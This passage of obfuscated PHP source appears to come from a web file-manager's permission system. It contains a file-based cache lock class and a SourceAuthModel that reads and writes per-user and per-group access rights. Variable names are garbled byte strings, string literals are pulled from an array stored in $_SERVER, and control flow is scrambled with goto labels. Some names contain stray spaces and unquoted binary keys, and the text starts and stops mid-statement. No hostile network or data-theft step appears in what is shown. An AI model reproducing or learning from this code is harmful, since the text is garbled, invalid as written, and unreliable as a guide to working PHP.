$e¿‡Üˆõ±ô[$B∞ØäÕ∆®Â[193]][$B∞ØäÕ∆®Â[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($fñ´∆◊Ö‰, $cÆΩı±é√˜ = 0) { goto Eõ´ö÷´…–; eÖ®ßåÍ›Á: $this->unlock($fñ´∆◊Ö‰); return !1; goto dâê¯ìù‘Ã; Eõ´ö÷´…–: $cÖÖ™¶∫≠« =& $_SERVER[™⁄»üÆ]; $b˜¨≥ûÆÓ‘ = microtime(!0); $A€ïªÂéÇì = $b˜¨≥ûÆÓ‘ + $cÆΩı±é√˜ + 0.0001; goto C∂ ùÎÛ; C∂ ùÎÛ: $E÷“¿≠ôÂ = rtrim(self::$cachePath, $cÖÖ™¶∫≠«[8]) . $cÖÖ™¶∫≠«[838] . md5($fñ´∆◊Ö‰) . $cÖÖ™¶∫≠«[835]; if (file_exists($E÷“¿≠ôÂ) && filemtime($E÷“¿≠ôÂ) && filemtime($E÷“¿≠ôÂ) < time() - 10) { @unlink($E÷“¿≠ôÂ); } do { if (file_exists($E÷“¿≠ôÂ)) { cacheLockWait(); continue; } $FñÌ¢±◊¡ = fopen($E÷“¿≠ôÂ, $cÖÖ™¶∫≠«[839]); if (!$FñÌ¢±◊¡) { return !1; } $Cø»‰¢íÛ¨ = flock($FñÌ¢±◊¡, LOCK_EX | LOCK_NB); self::$caches[$fñ´∆◊Ö‰] = array($cÖÖ™¶∫≠«[840] => $FñÌ¢±◊¡, $cÖÖ™¶∫≠«[193] => $E÷“¿≠ôÂ); fwrite($FñÌ¢±◊¡, $A€ïªÂéÇì); clearstatcache(); if ($FñÌ¢±◊¡ && $Cø»‰¢íÛ¨) { return !0; } cacheLockWait(); } while (microtime(!0) < $A€ïªÂéÇì); goto eÖ®ßåÍ›Á; dâê¯ìù‘Ã: } public function lockGet($BŸ‹£ª©…Ò) { $FÔ¡πÏÀëÑ =& $_SERVER[™⁄»üÆ]; $C≥Ø¡∏Ößª = rtrim(self::$cachePath, $FÔ¡πÏÀëÑ[8]) . $FÔ¡πÏÀëÑ[838] . md5($BŸ‹£ª©…Ò) . $FÔ¡πÏÀëÑ[835]; return file_exists($C≥Ø¡∏Ößª); } public function unlock($D®ËÜ¶Î‘ê) { goto bÕ∫áêâ…˜; c¨ΩÚÉµË: @flock($a¬êπ«õˆÇ[$F«·óÇ®è±[840]], LOCK_UN); @fclose($a¬êπ«õˆÇ[$F«·óÇ®è±[840]]); @unlink($a¬êπ«õˆÇ[$F«·óÇ®è±[193]]); goto AûÇˆÖ ∆⁄; bÕ∫áêâ…˜: $F«·óÇ®è± =& $_SERVER[™⁄»üÆ]; $a¬êπ«õˆÇ = self::$caches[$D®ËÜ¶Î‘ê]; if (!$a¬êπ«õˆÇ) { return; } goto c¨ΩÚÉµË; AûÇˆÖ ∆⁄: unset(self::$caches[$D®ËÜ¶Î‘ê]); goto A£§›áÍ™; A£§›áÍ™: } } goto BÆì†åÇ¢Û; B∑íÔÊπ”Ü: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\x63\x65\x5f\x61\165\164\150"; public function getAuth($BÀ“âÒá¿…) { goto CáîÀ™ßñ∂; bßïóË≠°°: array_multisort($D≠—Ωºµ¶Ã, SORT_DESC, $f”üÕµ÷Æë); return $f”üÕµ÷Æë; goto Cµ›òõÃ ¶; CáîÀ™ßñ∂: $Dª®¿™±ùª =& $_SERVER[™⁄»üÆ]; $BÕﬂÒ‚„çÜ = $this->sourceAuthSelect($BÀ“âÒá¿…); $f”üÕµ÷Æë = array(); goto dıÊƒ∆Ííﬁ; dıÊƒ∆Ííﬁ: $D≠—Ωºµ¶Ã = array(); $D£™¥˜ä¬Ã = 2 << 25; foreach ($BÕﬂÒ‚„çÜ as $E€¬”ãπÃç) { goto e˜µ∂√ïÏ; bÚ«›ê «∫: if ($E€¬”ãπÃç[$Dª®¿™±ùª[405]] == SourceModel::TYPE_USER && $E€¬”ãπÃç[$Dª®¿™±ùª[485]] == $Dª®¿™±ùª[191]) { $fÚ∂¡à◊◊• = 0; } $D≠—Ωºµ¶Ã[] = $a±Õë¿Ë≠Û[$Dª®¿™±ùª[407]] + $fÚ∂¡à◊◊•; goto F´–Ìò◊”∑; e˜µ∂√ïÏ: $a±Õë¿Ë≠Û = Model($Dª®¿™±ùª[489])->listData($E€¬”ãπÃç[$Dª®¿™±ùª[1806]]); if (!$a±Õë¿Ë≠Û) { continue; } $f”üÕµ÷Æë[] = $E€¬”ãπÃç; goto fáª¿ºªœÇ; fáª¿ºªœÇ: $fÚ∂¡à◊◊• = 0; if ($E€¬”ãπÃç[$Dª®¿™±ùª[405]] == SourceModel::TYPE_GROUP) { $fÚ∂¡à◊◊• = $D£™¥˜ä¬Ã * 2; } if ($E€¬”ãπÃç[$Dª®¿™±ùª[405]] == SourceModel::TYPE_USER) { $fÚ∂¡à◊◊• = $D£™¥˜ä¬Ã; } goto bÚ«›ê «∫; F´–Ìò◊”∑: } goto bßïóË≠°°; Cµ›òõÃ ¶: } public function sourceAuthSelect($e©ƒÉâãô≤) { goto f◊ÍúëÍ≈Ì; f®ÊÙÚÀÜ⁄: if ($C—…•ıúÌÆ) { $e©ƒÉâãô≤ = array($e©ƒÉâãô≤); } $A∏∆Çàßî = array(); foreach ($e©ƒÉâãô≤ as $dòŸô“ÖÔõ) { if (isset($A©„‘ÆŒ„‚[$dòŸô“ÖÔõ])) { $A∏∆Çàßî[$dòŸô“ÖÔõ] = $A©„‘ÆŒ„‚[$dòŸô“ÖÔõ]; } } goto A«ìËÜÑπ; A«ìËÜÑπ: if (count($A∏∆Çàßî) == count($e©ƒÉâãô≤)) { return $C—…•ıúÌÆ ? $A∏∆Çàßî[$e©ƒÉâãô≤[0]] : $A∏∆Çàßî; } $aƒî‡›ŸÈ… = $A“åÛÃΩá∆[1878]; $dŒ≥ß≤á— = array($A“åÛÃΩá∆[396] => array($A“åÛÃΩá∆[7], $e©ƒÉâãô≤)); goto E≠£ùí™èÕ; f◊ÍúëÍ≈Ì: $A“åÛÃΩá∆ =& $_SERVER[™⁄»üÆ]; static $A©„‘ÆŒ„‚ = array(); $C—…•ıúÌÆ = is_array($e©ƒÉâãô≤) ? !1 : !0; goto f®ÊÙÚÀÜ⁄; E≠£ùí™èÕ: $D√‘ùâåÉâ = $this->field($aƒî‡›ŸÈ…)->order($A“åÛÃΩá∆[394])->where($dŒ≥ß≤á—)->select(); $cúı”≤¥◊ﬁ = array_to_keyvalue_group($D√‘ùâåÉâ, $A“åÛÃΩá∆[396]); foreach ($e©ƒÉâãô≤ as $dòŸô“ÖÔõ) { $A©„‘ÆŒ„‚[$dòŸô“ÖÔõ] = $cúı”≤¥◊ﬁ[$dòŸô“ÖÔõ] ? $cúı”≤¥◊ﬁ[$dòŸô“ÖÔõ] : array(); } goto a‰Íö‰ı«§; a‰Íö‰ı«§: if ($C—…•ıúÌÆ) { return $D√‘ùâåÉâ; } return $cúı”≤¥◊ﬁ; goto FàŸ£ˆïﬂ; FàŸ£ˆïﬂ: } public function setAuth($Aﬂ…å©·ûÇ, $c¢ÑæË√ù˘) { goto A©•ÇÚÆÀõ; A©•ÇÚÆÀõ: $eãπÍÍÈ€≥ =& $_SERVER[™⁄»üÆ]; $BﬁÀ”ÌÁ∞Ç = Model($eãπÍÍÈ€≥[1214])->sourceInfo($Aﬂ…å©·ûÇ); if (!$BﬁÀ”ÌÁ∞Ç) { return !1; } goto fÎñçÈÃ⁄ÿ; AÖä∏ì®Â≈: if ($E™â ÿõúÍ != $B·ëÖŒ‡¿Ó) { $DêËªˆÂ˜– = array($eãπÍÍÈ€≥[1706] => $E™â ÿõúÍ); $d»Ÿπ´“Û∆ = Model($eãπÍÍÈ€≥[1792])->field($eãπÍÍÈ€≥[1537])->where($DêËªˆÂ˜–)->select(); $d»Ÿπ´“Û∆ = array_to_keyvalue($d»Ÿπ´“Û∆, $eãπÍÍÈ€≥[33], $eãπÍÍÈ€≥[1537]); } $f©ûõ◊‰ºÈ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $E‡•®í⁄ÉÁ = array(); goto d∆ÑèØóŸœ; d∆ÑèØóŸœ: foreach ($c¢ÑæË√ù˘ as $D∞Ö“ﬁ®ûÎ) { if (!in_array($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[405]], $f©ûõ◊‰ºÈ)) { show_json(LNG($eãπÍÍÈ€≥[1879]), !1); } if ($E™â ÿõúÍ != $B·ëÖŒ‡¿Ó) { if ($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[405]] == SourceModel::TYPE_GROUP) { } if ($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[485]] != 0 && !in_array($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[485]], $d»Ÿπ´“Û∆)) { } } if ($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[485]] == 0) { $D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[405]] = SourceModel::TYPE_USER; } $E‡•®í⁄ÉÁ[] = array($eãπÍÍÈ€≥[396] => $Aﬂ…å©·ûÇ, $eãπÍÍÈ€≥[405] => intval($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[405]]), $eãπÍÍÈ€≥[485] => intval($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[485]]), $eãπÍÍÈ€≥[1806] => intval($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[1806]]) ? intval($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[1806]]) : 0, $eãπÍÍÈ€≥[1860] => intval($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[1860]]) ? intval($D∞Ö“ﬁ®ûÎ[$eãπÍÍÈ€≥[1860]]) : -1); } $this->where(array($eãπÍÍÈ€≥[411] => $Aﬂ…å©·ûÇ))->delete(); $this->addAll($E‡•®í⁄ÉÁ); goto aç«”´ΩºÙ; fÎñçÈÃ⁄ÿ: if ($BﬁÀ”ÌÁ∞Ç[$eãπÍÍÈ€≥[405]] != SourceModel::TYPE_GROUP) { return !1; } $B·ëÖŒ‡¿Ó = 1; $E™â ÿõúÍ = $BﬁÀ”ÌÁ∞Ç[$eãπÍÍÈ€≥[485]]; goto AÖä∏ì®Â≈; aç«”´ΩºÙ: return !0; goto fÆ√Ÿèªïé; fÆ√Ÿèªïé: } public function authClear($Fµ◊‡õ¶Àç) { $aÆ◊€À€πÙ =& $_SERVER[™⁄»üÆ]; $E◊ó—∂§⁄Ê = Model($aÆ◊€À€πÙ[1214])->sourceInfo($Fµ◊‡õ¶Àç); $EèÁÿÏ≈â¢ = array($Fµ◊‡õ¶Àç); if ($E◊ó—∂§⁄Ê[$aÆ◊€À€πÙ[404]] == $aÆ◊€À€πÙ[87]) { $E§Ûº‡Â¢â = array($aÆ◊€À€πÙ[567] => array($aÆ◊€À€πÙ[526], $E◊ó—∂§⁄Ê[$aÆ◊€À€πÙ[503]] . $Fµ◊‡õ¶Àç . $aÆ◊€À€πÙ[527])); $EèÁÿÏ≈â¢ = Model($aÆ◊€À€πÙ[1214])->field($aÆ◊€À€πÙ[411])->where($E§Ûº‡Â¢â)->getField($aÆ◊€À€πÙ[396], !0); $EèÁÿÏ≈â¢[] = $Fµ◊‡õ¶Àç; } $this->where(array($aÆ◊€À€πÙ[411] => array($aÆ◊€À€πÙ[412], $EèÁÿÏ≈â¢)))->delete(); return !0; } public function getAllChildren($CøÃ∂„ﬁçÕ) { goto b•¯Ãñ¥Ôç; b¢å¯‹ãÎ€: return $this->sourceListAuth($aê·ÌÑÆÖ); goto d√»ÔÁﬂÎ∆; f›ÿ∞¿€±„: if ($DÜ‚™Óá¢Ë[$b„ÀÏ©çÇ [405]] != SourceModel::TYPE_GROUP) { return array(); } $C§Ê‡â∆∆∏ = 1; $bÜÉ·õ∑∞á = array($CøÃ∂„ﬁçÕ); goto aé√√ÂÖÚƒ; C ◊ÿ¿£Õ»: $DãÖÃ¨äÌÂ = Model($b„ÀÏ©çÇ [809])->field($B”È å¥óç)->where($A©˜˜Ìƒ§Û)->select(); $aê·ÌÑÆÖ = array($CøÃ∂„ﬁçÕ); foreach ($DãÖÃ¨äÌÂ as $aïÚö†ÑÚ‡) { foreach ($bÜÉ·õ∑∞á as $aá¥üáñàé) { $D¯ƒÁ®«ßÚ = $b„ÀÏ©çÇ [47] . $aá¥üáñàé . $b„ÀÏ©çÇ [47]; $eú„ä¶≥·ë = $aïÚö†ÑÚ‡[$b„ÀÏ©çÇ [503]] . $aïÚö†ÑÚ‡[$b„ÀÏ©çÇ [396]] . $b„ÀÏ©çÇ [47]; if (strstr($eú„ä¶≥·ë, $D¯ƒÁ®«ßÚ)) { $aê·ÌÑÆÖ[] = $aïÚö†ÑÚ‡[$b„ÀÏ©çÇ [396]]; break; } } } goto b¢å¯‹ãÎ€; b•¯Ãñ¥Ôç: $b„ÀÏ©çÇ  =& $_SERVER[™⁄»üÆ]; $DÜ‚™Óá¢Ë = Model($b„ÀÏ©çÇ [1214])->sourceInfo($CøÃ∂„ﬁçÕ); if ($DÜ‚™Óá¢Ë[$b„ÀÏ©çÇ [404]] != $b„ÀÏ©çÇ [87]) { return $this->sourceListAuth(array($CøÃ∂„ﬁçÕ)); } goto f›ÿ∞¿€±„; aé√√ÂÖÚƒ: if ($DÜ‚™Óá¢Ë[$b„ÀÏ©çÇ [479]] == $b„ÀÏ©çÇ [191] && $DÜ‚™Óá¢Ë[$b„ÀÏ©çÇ [485]] != $C§Ê‡â∆∆∏) { $bÜÉ·õ∑∞á = $this->groupChidldAllRootSource($DÜ‚™Óá¢Ë[$b„ÀÏ©çÇ [485]]); } $f·∏Ë≠÷ ò = $this->field($b„ÀÏ©çÇ [396])->group($b„ÀÏ©çÇ [396])->select(); $f·∏Ë≠÷ ò = array_to_keyvalue($f·∏Ë≠÷ ò, $b„ÀÏ©çÇ [33], $b„ÀÏ©çÇ [396]); goto dÀå«Æï…¬; dÀå«Æï…¬: if (!$f·∏Ë≠÷ ò) { return array(); } $B”È å¥óç = $b„ÀÏ©çÇ [1880]; $A©˜˜Ìƒ§Û = array($b„ÀÏ©çÇ [396] => array($b„ÀÏ©çÇ [7], $f·∏Ë≠÷ ò), $b„ÀÏ©çÇ [424] => $b„ÀÏ©çÇ [191]); goto C ◊ÿ¿£Õ»; d√»ÔÁﬂÎ∆: } private function sourceListAuth($eÏ—ôõ©Îì) { goto E¥õÓåèõ; e´ÕñéŒºπ: $FúØÆ…º†ô = array(); $f⁄ãÀıÏ§≥ = array(); foreach ($bêÿ≈¨ÙœÜ as $EÓ’©ÿüëó) { goto f€÷∑ÃÉÒ»; f€÷∑ÃÉÒ»: unset($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[435]]); unset($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[433]]); unset($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[407]]); goto e‹”ÛﬂÓõÜ; CçÖÒ€óÖü: $dàƒ⁄≠çÆè = count(explode($DôÕÉøÏÜ∂[8], trim($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[501]], $DôÕÉøÏÜ∂[8]))); $f⁄ãÀıÏ§≥[] = $dàƒ⁄≠çÆè + ($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[29]] == $DôÕÉøÏÜ∂[77] ? 0 : 1000); goto d’ ∏¢€éØ; e‹”ÛﬂÓõÜ: unset($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[85]]); $e»á»ÑÒ¢¯ = $dåØﬁñæ≤Ö[$EÓ’©ÿüëó[$DôÕÉøÏÜ∂[396]]]; if (!$e»á»ÑÒ¢¯) { continue; } goto F†»ÚÎ∫›ä; F†»ÚÎ∫›ä: $EÓ’©ÿüëó[$DôÕÉøÏÜ∂[1881]] = $this->authTargetInfo($e»á»ÑÒ¢¯); $EÓ’©ÿüëó[$DôÕÉøÏÜ∂[501]] = rtrim($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[507]], $DôÕÉøÏÜ∂[8]) . $DôÕÉøÏÜ∂[8] . ltrim($EÓ’©ÿüëó[$DôÕÉøÏÜ∂[501]], $DôÕÉøÏÜ∂[8]); $FúØÆ…º†ô[] = $EÓ’©ÿüëó; goto CçÖÒ€óÖü; d’ ∏¢€éØ: } goto fÆÈ¢¢⁄≥ù; E¥õÓåèõ: $DôÕÉøÏÜ∂ =& $_SERVER[™⁄»üÆ]; $bêÿ≈¨ÙœÜ = Model($DôÕÉøÏÜ∂[1214])->sourceListInfo($eÏ—ôõ©Îì, !0); $dåØﬁñæ≤Ö = $this->sourceAuthSelect($eÏ—ôõ©Îì); goto e´ÕñéŒºπ; fÆÈ¢¢⁄≥ù: array_multisort($f⁄ãÀıÏ§≥, SORT_ASC, $FúØÆ…º†ô); return $FúØÆ…º†ô; goto CıØø†ÂúË; CıØø†ÂúË: } private function groupChidldAllRootSource($BîÖﬂ«ÔâÇ) { $fÛ∫¥˘¨·É =& $_SERVER[™⁄»üÆ]; $F©Ê“Â‰—Ú = Model($fÛ∫¥˘¨·É[1882])->groupChildrenAll($BîÖﬂ«ÔâÇ); $BÊ‡å≥≠∫î = array($fÛ∫¥˘¨·É[479] => 0, $fÛ∫¥˘¨·É[485] => array($fÛ∫¥˘¨·É[7], $F©Ê“Â‰—Ú), $fÛ∫¥˘¨·É[405] => SourceModel::TYPE_GROUP); $AäÊ‡¢ÙÃÏ = Model($fÛ∫¥˘¨·É[809])->field($fÛ∫¥˘¨·É[396])->where($BÊ‡å≥≠∫î)->select(); $AäÊ‡¢ÙÃÏ = array_to_keyvalue($AäÊ‡¢ÙÃÏ, $fÛ∫¥˘¨·É[33], $fÛ∫¥˘¨·É[396]); return $AäÊ‡¢ÙÃÏ; } private function authTargetInfo($d¡âø’Òˆ¨) { goto fü©àâíπ®; cØÉñÂß∫∑: $d˘ΩñÒëÛ⁄ = 2 << 25; foreach ($d¡âø’Òˆ¨ as $aóﬂ∂”û∑¬) { goto D±»ôúôÕå; BÎíı˜¢ô∂: $B°≥Ÿ‘ﬂõÿ = 0; if ($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[405]] == SourceModel::TYPE_GROUP) { $B°≥Ÿ‘ﬂõÿ = $d˘ΩñÒëÛ⁄ * 2; } if ($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[405]] == SourceModel::TYPE_USER) { $B°≥Ÿ‘ﬂõÿ = $d˘ΩñÒëÛ⁄; } goto câ∆ç«æ∑; D±»ôúôÕå: $Aøààﬁ¡…‚ = Model($FŒ‹Ú≤ªîê[489])->listData($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[1806]]); if (!$Aøààﬁ¡…‚) { continue; } if ($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[405]] == SourceModel::TYPE_USER) { $C¿Üÿ¶Ò≈¯ = Model($FŒ‹Ú≤ªîê[495])->getInfoSimpleOuter($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[485]]); if ($C¿Üÿ¶Ò≈¯[$FŒ‹Ú≤ªîê[1537]] == $FŒ‹Ú≤ªîê[1093]) { continue; } if ($C¿Üÿ¶Ò≈¯[$FŒ‹Ú≤ªîê[1537]] == $FŒ‹Ú≤ªîê[191]) { $C¿Üÿ¶Ò≈¯[$FŒ‹Ú≤ªîê[28]] = LNG($FŒ‹Ú≤ªîê[1883]); } } else { $C¿Üÿ¶Ò≈¯ = Model($FŒ‹Ú≤ªîê[504])->getInfoSimple($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[485]]); } goto bÜÈ§±åﬁÓ; bÜÈ§±åﬁÓ: if (!$C¿Üÿ¶Ò≈¯) { continue; } $C¿Üÿ¶Ò≈¯[$FŒ‹Ú≤ªîê[447]] = $Aøààﬁ¡…‚; $AΩÇÜ˜”®∏[] = $C¿Üÿ¶Ò≈¯; goto BÎíı˜¢ô∂; câ∆ç«æ∑: if ($aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[405]] == SourceModel::TYPE_USER && $aóﬂ∂”û∑¬[$FŒ‹Ú≤ªîê[485]] == $FŒ‹Ú≤ªîê[191]) { $B°≥Ÿ‘ﬂõÿ = 0; } $FÙÃ´ﬂöÙ”[] = $Aøààﬁ¡…‚[$FŒ‹Ú≤ªîê[407]] + $B°≥Ÿ‘ﬂõÿ; goto Eàá≠–Ïùù; Eàá≠–Ïùù: } array_multisort($FÙÃ´ﬂöÙ”, SORT_DESC, $AΩÇÜ˜”®∏); goto f¿ÀΩôπàå; fü©àâíπ®: $FŒ‹Ú≤ªîê =& $_SERVER[™⁄»üÆ]; $AΩÇÜ˜”®∏ = array(); $FÙÃ´ﬂöÙ” = array(); goto cØÉñÂß∫∑; f¿ÀΩôπàå: return $AΩÇÜ˜”®∏; goto D´èØµµèÌ; D´èØµµèÌ: } public function getAllChildrenByUser($A–”÷π∆¶õ, $cãöêºÉÆ„) { goto Eñ–◊ÈëÆä; fö»Û∞‘é¿: foreach ($bªÓÏÉö†¯ as $b»î’ö€ıà) { $e‰¡›ú…î´ = !1; foreach ($b»î’ö€ıà[$DÿâóÉÇ€[1881]] as $eÈ´´„å∞‚) { if ($eÈ´´„å∞‚[$DÿâóÉÇ€[1537]]) { if ($eÈ´´„å∞‚[$DÿâóÉÇ€[1537]] == $cãöêºÉÆ„) { $e‰¡›ú…î´ = !0; break; } } if ($eÈ´´„å∞‚[$DÿâóÉÇ€[1706]]) { if ($this->groupContainUser($eÈ´´„å∞‚[$DÿâóÉÇ€[1706]], $cãöêºÉÆ„)) { $e‰¡›ú…î´ = !0; break; } } } if ($e‰¡›ú…î´) { $Dÿ†«≥∂ ä[] = $b»î’ö€ıà; } $DáÂÉÑïèß = $b»î’ö€ıà[$DÿâóÉÇ€[396]]; if (isset($DéÜ≤∫¢∂Û[$DáÂÉÑïèß])) { $b»î’ö€ıà[$DÿâóÉÇ€[1881]][] = $DéÜ≤∫¢∂Û[$DáÂÉÑïèß][0]; $DéÜ≤∫¢∂Û[$DáÂÉÑïèß] = !1; } } $DéÜ≤∫¢∂Û = array_filter(array_values($DéÜ≤∫¢∂Û)); $Dÿ†«≥∂ ä = array_merge($DéÜ≤∫¢∂Û, $Dÿ†«≥∂ ä); goto AääñΩ—“û; AääñΩ—“û: return $Dÿ†«≥∂ ä; goto bÖÿØË•∞•; e€≈’˜Ûàé: $A¢Â—§π÷ì = Model($DÿâóÉÇ€[1214])->sourceInfo($A–”÷π∆¶õ); $DéÜ≤∫¢∂Û = array(); $E‰∫ì≥Œûæ = 1; goto B•ÕöûûÒ°; Eñ–◊ÈëÆä: $DÿâóÉÇ€ =& $_SERVER[™⁄»üÆ]; $A“•…˜¬¿® = Model($DÿâóÉÇ€[520])->getInfo($cãöêºÉÆ„); if (!$cãöêºÉÆ„ || !$A–”÷π∆¶õ || !$A“•…˜¬¿®) { return array(); } goto e€≈’˜Ûàé; B•ÕöûûÒ°: if ($A¢Â—§π÷ì[$DÿâóÉÇ€[479]] == $DÿâóÉÇ€[191] && $A¢Â—§π÷ì[$DÿâóÉÇ€[485]] != $E‰∫ì≥Œûæ && $this->groupContainUser($A¢Â—§π÷ì[$DÿâóÉÇ€[485]], $cãöêºÉÆ„)) { foreach ($A“•…˜¬¿®[$DÿâóÉÇ€[1884]] as $e‘«˜»äÜ≤) { $F˜Ù§ÇÑƒà = Model($DÿâóÉÇ€[504])->getInfo($e‘«˜»äÜ≤[$DÿâóÉÇ€[1706]]); $eÔééÇéõå = Model($DÿâóÉÇ€[520])->getInfoSimpleOuter($cãöêºÉÆ„); $eÔééÇéõå[$DÿâóÉÇ€[447]] = $e‘«˜»äÜ≤[$DÿâóÉÇ€[407]]; if (Model($DÿâóÉÇ€[489])->authCheckAction($e‘«˜»äÜ≤[$DÿâóÉÇ€[407]][$DÿâóÉÇ€[407]], $DÿâóÉÇ€[1726])) { continue; } $Fıø·£©Œ˘ = array($DÿâóÉÇ€[28] => $DÿâóÉÇ€[1489] . $F˜Ù§ÇÑƒà[$DÿâóÉÇ€[28]], $DÿâóÉÇ€[396] => $F˜Ù§ÇÑƒà[$DÿâóÉÇ€[85]][$DÿâóÉÇ€[396]], $DÿâóÉÇ€[76] => KodIO::make($F˜Ù§ÇÑƒà[$DÿâóÉÇ€[85]][$DÿâóÉÇ€[396]]), $DÿâóÉÇ€[479] => $DÿâóÉÇ€[191], $DÿâóÉÇ€[405] => $DÿâóÉÇ€[497], $DÿâóÉÇ€[29] => $DÿâóÉÇ€[531], $DÿâóÉÇ€[501] => $F˜Ù§ÇÑƒà[$DÿâóÉÇ€[508]], $DÿâóÉÇ€[1706] => $F˜Ù§ÇÑƒà[$DÿâóÉÇ€[1706]], $DÿâóÉÇ€[505] => $F˜Ù§ÇÑƒà[$DÿâóÉÇ€[479]], $DÿâóÉÇ€[1881] => array($eÔééÇéõå)); $DéÜ≤∫¢∂Û[$Fıø·£©Œ˘[$DÿâóÉÇ€[396]]] = $Fıø·£©Œ˘; } } $Dÿ†«≥∂ ä = array(); $bªÓÏÉö†¯ = $this->getAllChildren($A–”÷π∆¶õ); goto fö»Û∞‘é¿; bÖÿØË•∞•: } public function setAllChildrenByUser($F±—ßÕÜô, $fÈ≤Ÿ…øó¯, $cÑ˜ä–¢Î‚) { $E¿Ç±Ïï®á =& $_SERVER[™⁄»üÆ]; $C¯Ì›èï¶° = $this->getAllChildrenByUser($F±—ßÕÜô, $fÈ≤Ÿ…øó¯); if (!$cÑ˜ä–¢Î‚ || !$C¯Ì›èï¶°) { return !1; } foreach ($C¯Ì›èï¶° as $Eπ‹îÃ£èé) { $f—ôä®ºª™ = array(); foreach ($Eπ‹îÃ£èé[$E¿Ç±Ïï®á[1881]] as $AÈäæÜ¢”Õ) { $Bö§óÈ”∑… = $AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[447]]; $B◊†…ÜÂó˜ = $AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[1537]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $aç‡ºŸ™ä‘ = $AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[1537]] ? $AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[1537]] : $AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[1706]]; if ($AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[1537]] && $AÈäæÜ¢”Õ[$E¿Ç±Ïï®á[1537]] == $fÈ≤Ÿ…øó¯) { continue; } $f—ôä®ºª™[] = array($E¿Ç±Ïï®á[396] => $Eπ‹îÃ£èé[$E¿Ç±Ïï®á[396]], $E¿Ç±Ïï®á[405] => $B◊†…ÜÂó˜, $E¿Ç±Ïï®á[485] => intval($aç‡ºŸ™ä‘), $E¿Ç±Ïï®á[1806] => isset($Bö§óÈ”∑…[$E¿Ç±Ïï®á[394]]) ? intval($Bö§óÈ”∑…[$E¿Ç±Ïï®á[394]]) : 0, $E¿Ç±Ïï®á[1860] => isset($Bö§óÈ”∑…[$E¿Ç±Ïï®á[1860]]) ? intval($Bö§óÈ”∑…[$E¿Ç±Ïï®á[1860]]) : -1); } $f—ôä®ºª™[] = array($E¿Ç±Ïï®á[396] => $Eπ‹îÃ£èé[$E¿Ç±Ïï®á[396]], $E¿Ç±Ïï®á[405] => SourceModel::TYPE_USER, $E¿Ç±Ïï®á[485] => intval($fÈ≤Ÿ…øó¯), $E¿Ç±Ïï®á[1806] => intval($cÑ˜ä–¢Î‚), $E¿Ç±Ïï®á[1860] => -1); $this->where(array($E¿Ç±Ïï®á[411] => $Eπ‹îÃ£èé[$E¿Ç±Ïï®á[396]]))->delete(); $this->addAll($f—ôä®ºª™); } return !0; } public function get($eÀÙÁù™∏…) { $dÙÿ≈∑π‚§ = $this->getSourceList(array($eÀÙÁù™∏…), !0); return $dÙÿ≈∑π‚§[0]; } public function getSourceList($e“‹ﬂ•È°, $DŸüñ—»ÉΩ = false, $Fã¯‚ê»ëî = false) { goto EÉåâÉÜ…≈; DÁ∏äÏ„ï∞: if (!$DŸüñ—»ÉΩ && count($e“‹ﬂ•È°) == 1) { $DŸüñ—»ÉΩ = array(); $DŸüñ—»ÉΩ[$e“‹ﬂ•È°[0]] = $BÃ˜πê›å->sourceInfo($e“‹ﬂ•È°[0]); } if (!$DŸüñ—»ÉΩ) { $EêÆÍÙ∞¥º = array($d‡∆¢¿◊ºÉ[411] => array($d‡∆¢¿◊ºÉ[412], $e“‹ﬂ•È°)); $DŸüñ—»ÉΩ = $BÃ˜πê›å->field($d‡∆¢¿◊ºÉ[1885])->where($EêÆÍÙ∞¥º)->select(); $DŸüñ—»ÉΩ = array_to_keyvalue($DŸüñ—»ÉΩ, $d‡∆¢¿◊ºÉ[396]); } $D∫Ç°öÔΩ∞ = $e“‹ﬂ•È°; goto aöÜˆÁÏœã; a‡Âòììµë: $f–†Õ◊¬ïÜ = array(); foreach ($DŸüñ—»ÉΩ as $BüèÃ•€’¡ => $C∞„èïèåã) { if ($fƒøêü»õ∏) { $f–†Õ◊¬ïÜ[$BüèÃ•€’¡] = $eá∫àáÇ€÷; continue; } $f–†Õ◊¬ïÜ[$BüèÃ•€’¡] = $this->makeSourceAuth($C∞„èïèåã, $dÖÔÆ∞Ñ„, $Fã¯‚ê»ëî); } return $f–†Õ◊¬ïÜ; goto DÜ≤ï‰£õÙ; aöÜˆÁÏœã: foreach ($DŸüñ—»ÉΩ as $AôëÖ“Úîò => $EŒÊúüÕ¿…) { $b˘ß∑πì≈π = $BÃ˜πê›å->parentLevelArray($EŒÊúüÕ¿…[$d‡∆¢¿◊ºÉ[503]]); $D∫Ç°öÔΩ∞ = 